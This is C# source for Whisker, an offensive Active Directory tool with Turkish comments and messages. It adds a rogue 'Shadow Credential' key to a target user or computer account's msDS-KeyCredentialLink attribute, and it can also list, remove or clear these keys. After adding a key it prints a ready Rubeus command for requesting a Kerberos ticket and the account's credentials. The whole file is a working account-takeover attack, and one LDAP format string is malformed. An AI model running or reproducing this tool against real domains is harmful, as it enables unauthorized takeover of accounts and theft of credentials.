using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using DSInternals.Common.Data;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Collections.Generic;
using System.Reflection;

namespace Whisker
{
    public class Program
    {
        // Kod Rubeus'tan alinmistir
        private static DirectoryEntry GetLdapSearchRoot(string OUName, string domainController, string domain)
        {
            DirectoryEntry directoryObject = null;
            string ldapPrefix = "";
            string ldapOu = "";

            // Elimizde bir DC varsa domain adi yerine onu kullan; boylece kullanicinin
            // ad cozumlemesi (name resolution) calismasa bile bir DC'nin IP adresi belirtilmisse islem yapabilir
            if (!String.IsNullOrEmpty(domainController))
            {
                ldapPrefix = domainController;
            }
            else if (!String.IsNullOrEmpty(domain)) // DC yoksa (varsa) domain adini kullan
            {
                ldapPrefix = domain;
            }

            if (!String.IsNullOrEmpty(OUName))
            {
                ldapOu = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
            }
            else if (!String.IsNullOrEmpty(domain))
            {
                ldapOu = String.Format("DC={0}", domain.Replace(".", ",DC="));
            }

            // Ne DC, ne domain, ne kimlik bilgisi ne de OU belirtilmediyse
            if (String.IsNullOrEmpty(ldapPrefix) && String.IsNullOrEmpty(ldapOu))
            {
                directoryObject = new DirectoryEntry();
            }
            else // Bir onek (DC veya domain), bir OU yolu veya ikisi birden varsa
            {
                string bindPath = "";
                if (!String.IsNullOrEmpty(ldapPrefix))
                {
                    bindPath = String.Format("LDAP://{0}", ldapPrefix);
                }
                if (!String.IsNullOrEmpty(ldapOu))
                {
                    if (!String.IsNullOrEmpty(bindPath))
                    {
                        bindPath = String.Format("{0}/{1}", bindPath, ldapOu);
                    }
                    else
                    {
                        bindPath = String.Format("LDAP://{1]", ldapOu);
                    }
                }

                directoryObject = new DirectoryEntry(bindPath);
            }

            if (directoryObject != null)
            {
                directoryObject.AuthenticationType = AuthenticationTypes.Secure | AuthenticationTypes.Sealing | AuthenticationTypes.Signing;
            }

            return directoryObject;
        }

        // Kod Rubeus'tan alinmistir
        private static DirectoryEntry LocateAccount(string username, string domain, string domainController)
        {
            DirectoryEntry directoryObject = null;
            DirectorySearcher userSearcher = null;

            try
            {
                directoryObject = GetLdapSearchRoot("", domainController, domain);
                userSearcher = new DirectorySearcher(directoryObject);
                userSearcher.PageSize = 1;
            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    Console.WriteLine("\r\n[X] Domain arama nesnesi (searcher) olusturulurken hata: {0}", ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("\r\n[X] Domain arama nesnesi (searcher) olusturulurken hata: {0}", ex.Message);
                }
                return null;
            }

            // Baglantinin (bind) dogru calistigini kontrol et
            try
            {
                string dirPath = directoryObject.Path;
                Console.WriteLine("[*] Hedef hesap araniyor");
            }
            catch (DirectoryServicesCOMException ex)
            {
                Console.WriteLine("\r\n[X] Domain arama nesnesi dogrulanirken hata: {0}", ex.Message);
                return null;
            }

            try
            {
                string userSearchFilter = String.Format("(samAccountName={0})", username);
                userSearcher.Filter = userSearchFilter;
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n[X] Domain arama filtresi ayarlanirken hata: {0}", ex.InnerException.Message);
                return null;
            }

            try
            {
                SearchResult user = userSearcher.FindOne();

                if (user == null)
                {
                    Console.WriteLine("[!] Hedef kullanici bulunamadi");
                }

                string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                Console.WriteLine("[*] Hedef kullanici bulundu: {0}", distinguishedName);

                return user.GetDirectoryEntry();

            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    Console.WriteLine("\r\n[X] Domain arama nesnesi calistirilirken hata: {0}", ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("\r\n[X] Domain arama nesnesi calistirilirken hata: {0}", ex.Message);
                }
                return null;
            }
        }

        // Kod https://stackoverflow.com/questions/13806299/how-can-i-create-a-self-signed-certificate-using-c adresinden alinmistir
        static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            RSA rsa = new RSACryptoServiceProvider(2048, new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString()));
            CertificateRequest req = new CertificateRequest(String.Format("cn={0}", cn), rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

        static void SaveCert(X509Certificate2 cert, string path, string password)
        {
            // Ozel anahtar (private key) ile birlikte PFX (PKCS #12) olustur
            File.WriteAllBytes(path, cert.Export(X509ContentType.Pfx, password));
        }

        private static void PrintHelp()
        {
            string usage = @"
Whisker, Active Directory kullanici ve bilgisayar hesaplarini msDS-KeyCredentialLink
oznitelikleri uzerinden ele gecirmek icin gelistirilmis bir C# aracidir; bu islem, hedef
hesaba etkin bicimde bir 'Shadow Credential' eklenmesi anlamina gelir.

  Kullanim: ./Whisker.exe [list|add|remove|clear] /target:<samAccountName> [/deviceID:<GUID>] [/domain:<FQDN>]
               [/dc:<IP/HOSTNAME>] [/password:<PAROLA>] [/path:<YOL>]

  Modlar
    list            Hedef nesnenin msDS-KeyCredentialLink oznitelik degerlerinin tamamini listeler
    add             Hedef nesnenin msDS-KeyCredentialLink oznitelegine yeni bir deger ekler
    remove          Hedef nesnenin msDS-KeyCredentialLink oznitelegindeki bir degeri kaldirir
    clear           Hedef nesnenin msDS-KeyCredentialLink oznitelegindeki tum degerleri temizler.
                    Uyari: Parolasiz kimlik dogrulama (passwordless authentication) icin
                    yapilandirilmis hesaplarda bu oznitelik temizlenirse aksakliklara yol acar.

  Argumanlar:
    /target:<samAccountName>  Zorunlu. Hedef nesnenin adini belirtir. Bilgisayar nesneleri '$' ile bitmelidir.

    /deviceID:<GUID>          [remove modu] remove modunda zorunludur. Hedef nesnenin msDS-KeyCredentialLink
                              oznitelieginden kaldirilacak degerin DeviceID'sini belirtir. Gecerli bir GUID olmalidir.

    [/domain:<FQDN>]          Istege bagli. Hedefin tam nitelikli alan adini (FQDN) belirtir. Verilmezse
                              mevcut kullanicinin FQDN'si cozumlenmeye calisilir.

    [/dc:<IP/HOSTNAME>]       Istege bagli. Hedef Domain Controller'i (DC) belirtir. Verilmezse
                              Primary Domain Controller (PDC) hedeflenmeye calisilir.

    [/password:<PAROLA>]      [add modu] add modunda istege baglidir. Saklanan kendinden imzali (self-signed)
                              sertifikanin parolasini belirtir. Verilmezse rastgele bir parola uretilir.

    [/path:<YOL>]             [add modu] add modunda istege baglidir. Uretilen kendinden imzali sertifikanin
                              kaydedilecegi dosya yolunu belirtir. Verilmezse sertifika Base64 olarak ekrana yazdirilir.

==[Ornekler]=========

  list    => Whisker.exe list /target:computername$ /domain:constoso.local /dc:dc1.contoso.local
  add     => Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\yol\dosya.pfx /password:P@ssword1
  remove  => Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /deviceid:2de4643a-2e0b-438f-a99d-5cb058b3254b
  clear   => Whisker.exe clear /target:computername$ /domain:constoso.local /dc:dc1.contoso.local

Bu saldirinin basarili olabilmesi icin ortamda en az Windows Server 2016 calistiran bir Domain Controller
bulunmali ve bu Domain Controller'in, PKINIT Kerberos kimlik dogrulamasina izin veren bir sunucu
kimlik dogrulama (server authentication) sertifikasi olmalidir.

Bu arac, Michael Grafnetter'in (@MGrafnetter) DSInternals projesindeki koda dayanmaktadir.
";
            Console.WriteLine(usage);
        }

        private static string GenerateRandomPassword()
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[16];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        private static void DecodeDnWithBinary(object dnWithBinary, out byte[] binaryPart, out string dnString)
        {
            System.Type type = dnWithBinary.GetType();

            binaryPart = (byte[])type.InvokeMember(
            "BinaryValue",
            BindingFlags.GetProperty,
            null,
            dnWithBinary,
            null
            );

            dnString = (string)type.InvokeMember(
            "DNString",
            BindingFlags.GetProperty,
            null,
            dnWithBinary,
            null
            );
        }

        public static void Main(string[] args)
        {
            try
            {
                string command = null;
                if (args.Length > 0)
                {
                    command = args[0].ToLower();
                }

                if (String.IsNullOrEmpty(command) || command.Equals("help") || !(command.Equals("add") || command.Equals("remove") || command.Equals("clear") || command.Equals("list")))
                {
                    PrintHelp();
                    return;
                }

                var arguments = new Dictionary<string, string>();
                for (int i = 1; i < args.Length; i++)
                {
                    string argument = args[i];
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                    {
                        arguments[argument.Substring(1, idx - 1).ToLower()] = argument.Substring(idx + 1);
                    }
                    else
                    {
                        idx = argument.IndexOf('=');
                        if (idx > 0)
                        {
                            arguments[argument.Substring(1, idx - 1).ToLower()] = argument.Substring(idx + 1);
                        }
                        else
                        {
                            arguments[argument.Substring(1).ToLower()] = string.Empty;
                        }
                    }
                }

                string target;
                string domain;
                string dc;
                string path;
                string password;
                Guid deviceID = Guid.Empty;

                if (!arguments.ContainsKey("target") || String.IsNullOrEmpty(arguments["target"]))
                {
                    Console.WriteLine("[X] /target zorunludur ve hedef nesnenin adini icermelidir.\r\n");
                    PrintHelp();
                    return;
                }
                else
                {
                    target = arguments["target"];
                }

                if (command.Equals("remove"))
                {
                    try
                    {
                        Guid.TryParse(arguments["deviceid"], out deviceID);
                    }
                    catch
                    {
                        Console.WriteLine("[X] /deviceid icin gecerli bir Guid saglanmadi");
                        return;
                    }
                }


                if (!arguments.ContainsKey("domain") || String.IsNullOrEmpty(arguments["domain"]))
                {
                    try
                    {
                        domain = Domain.GetCurrentDomain().Name; // domain null ise mevcut kullanicinin domainini bulmaya calisir
                    }
                    catch
                    {
                        Console.WriteLine("[!] Mevcut kullanicinin domaini cozumlenemedi. Lutfen tam nitelikli alan adini (FQDN) belirtmek icin /domain secenegini kullanin");
                        return;
                    }
                }
                else
                {
                    domain = arguments["domain"];
                }

                if (!arguments.ContainsKey("dc") || String.IsNullOrEmpty(arguments["dc"]))
                {
                    try
                    {
                        dc = Domain.GetCurrentDomain().PdcRoleOwner.Name; // dc null ise mevcut kullanicinin domainindeki PDC'yi bulmaya calisir
                    }
                    catch
                    {
                        Console.WriteLine("[!] DC bulunamadi. Lutfen DC'nin IP/hostname bilgisini belirtmek icin /dc secenegini kullanin");
                        return;
                    }
                }
                else
                {
                    dc = arguments["dc"];
                }

                if (!arguments.ContainsKey("path") || String.IsNullOrEmpty(arguments["path"]))
                {
                    path = "";
                }
                else
                {
                    path = arguments["path"];
                }

                if (!arguments.ContainsKey("password") || String.IsNullOrEmpty(arguments["password"]))
                {
                    password = "";
                }
                else
                {
                    password = arguments["password"];
                }

                switch (command)
                {
                    case "add":
                        Add(target, domain, dc, path, password);
                        break;
                    case "remove":
                        Remove(target, domain, dc, deviceID);
                        break;
                    case "clear":
                        Clear(target, domain, dc);
                        break;
                    case "list":
                        List(target, domain, dc);
                        break;
                    default:
                        PrintHelp();
                        break;
                }
            }
            catch (System.Exception ex)
            {
                Console.WriteLine("[!] Hata: {0}", ex.Message);
                return;
            }
        }

        static void Add(string target, string fqdn, string dc, string path, string password)
        {
            if (String.IsNullOrEmpty(path))
            {
                Console.WriteLine("[*] Herhangi bir yol belirtilmedi. Sertifika Base64 olarak ekrana yazdirilacak", path);
            }
            if (String.IsNullOrEmpty(password))
            {
                password = GenerateRandomPassword();
                Console.WriteLine("[*] Parola belirtilmedi. Sertifika {0} parolasiyla kaydedilecek", password);
            }

            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            X509Certificate2 cert = null;
            KeyCredential keyCredential = null;

            Console.WriteLine("[*] Sertifika olusturuluyor");
            cert = GenerateSelfSignedCert(target);
            Console.WriteLine("[*] Sertifika olusturuldu");
            Console.WriteLine("[*] KeyCredential olusturuluyor");
            Guid guid = Guid.NewGuid();
            keyCredential = new KeyCredential(cert, guid, targetObject.Properties["distinguishedName"][0].ToString(), DateTime.Now);
            Console.WriteLine("[*] DeviceID {0} ile KeyCredential olusturuldu", guid.ToString());

            try
            {
                Console.WriteLine("[*] Hedef nesnenin msDS-KeyCredentialLink oznitelegi guncelleniyor");
                targetObject.Properties["msDS-KeyCredentialLink"].Add(keyCredential.ToDNWithBinary());
                targetObject.CommitChanges();
                Console.WriteLine("[+] Hedef nesnenin msDS-KeyCredentialLink oznitelegi guncellendi");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Oznitelik guncellenemedi: {0}", e.Message);
                return;
            }

            string certOutput = "";
            try
            {
                if (String.IsNullOrEmpty(path))
                {
                    //Console.WriteLine("[*] Iliskili sertifika:\r\n");
                    byte[] certBytes = cert.Export(X509ContentType.Pfx, password);
                    certOutput = Convert.ToBase64String(certBytes);
                    //Console.WriteLine(certOutput);
                }
                else
                {
                    Console.WriteLine("[*] Iliskili sertifika dosyaya kaydediliyor...");
                    SaveCert(cert, path, password);
                    Console.WriteLine("[*] Iliskili sertifika {0} konumuna kaydedildi", path);
                    certOutput = path;
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Sertifika dosyaya kaydedilemedi: {0}", e.Message);
            }

            Console.WriteLine("[*] Artik Rubeus'u su sozdizimiyle calistirabilirsiniz:\r\n");
            Console.WriteLine("Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /domain:{3} /dc:{4} /getcredentials /show", target, certOutput, password, fqdn, dc);
        }

        static void Remove(string target, string fqdn, string dc, Guid deviceID)
        {
            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            try
            {
                Console.WriteLine("[*] Hedef nesnenin msDS-KeyCredentialLink oznitelegi guncelleniyor");

                bool found = false;
                for (int i = 0; i < targetObject.Properties["msDS-KeyCredentialLink"].Count; i++)
                {
                    byte[] binaryPart = null;
                    string dnString = null;
                    DecodeDnWithBinary(targetObject.Properties["msDS-KeyCredentialLink"][i], out binaryPart, out dnString);
                    KeyCredential kc = new KeyCredential(binaryPart, dnString);
                    if (kc.DeviceId.Equals(deviceID))
                    {
                        targetObject.Properties["msDS-KeyCredentialLink"].RemoveAt(i);
                        found = true;
                        Console.WriteLine("[+] Kaldirilacak deger bulundu");
                    }
                }
                if (!found)
                {
                    Console.WriteLine("[X] Hedef nesnede belirtilen DeviceID'ye sahip bir deger bulunamadi");
                    return;
                }
                targetObject.CommitChanges();
                Console.WriteLine("[+] Hedef nesnenin msDS-KeyCredentialLink oznitelegi guncellendi");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Oznitelik guncellenemedi: {0}", e.Message);
                return;
            }
        }

        static void Clear(string target, string fqdn, string dc)
        {
            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            try
            {
                Console.WriteLine("[*] Hedef nesnenin msDS-KeyCredentialLink oznitelegi guncelleniyor");
                targetObject.Properties["msDS-KeyCredentialLink"].Clear();
                targetObject.CommitChanges();
                Console.WriteLine("[+] Hedef nesnenin msDS-KeyCredentialLink oznitelegi guncellendi");
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Oznitelik guncellenemedi: {0}", e.Message);
                return;
            }
        }

        static void List(string target, string fqdn, string dc)
        {
            DirectoryEntry targetObject = LocateAccount(target, fqdn, dc);
            if (targetObject == null)
            {
                return;
            }

            Console.WriteLine("[*] {0} icin cihazlar listeleniyor:", target);
            if (targetObject.Properties["msDS-KeyCredentialLink"].Count == 0)
            {
                Console.WriteLine("[*] Hic kayit yok!");
            }
            else
            {
                for (int i = 0; i < targetObject.Properties["msDS-KeyCredentialLink"].Count; i++)
                {
                    byte[] binaryPart = null;
                    string dnString = null;
                    DecodeDnWithBinary(targetObject.Properties["msDS-KeyCredentialLink"][i], out binaryPart, out dnString);
                    KeyCredential kc = new KeyCredential(binaryPart, dnString);
                    Console.WriteLine("    DeviceID: {0} | Olusturulma Zamani: {1}", kc.DeviceId, kc.CreationTime);
                }
            }
        }

    }
}
